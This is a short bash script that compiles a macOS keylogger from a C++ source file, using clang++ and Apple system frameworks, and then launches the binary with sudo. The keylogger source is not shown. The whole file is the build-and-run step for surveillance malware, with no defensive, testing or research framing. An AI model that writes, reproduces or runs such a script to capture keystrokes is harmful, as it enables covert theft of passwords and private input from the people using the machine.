#!/bin/bash
# Build and run script for macOS

# Compile the macOS keylogger
clang++ -o keylogger_mac keylogger_mac.cpp -I../include -framework ApplicationServices -framework Carbon -framework CoreFoundation

# Run the keylogger
sudo ./keylogger_mac
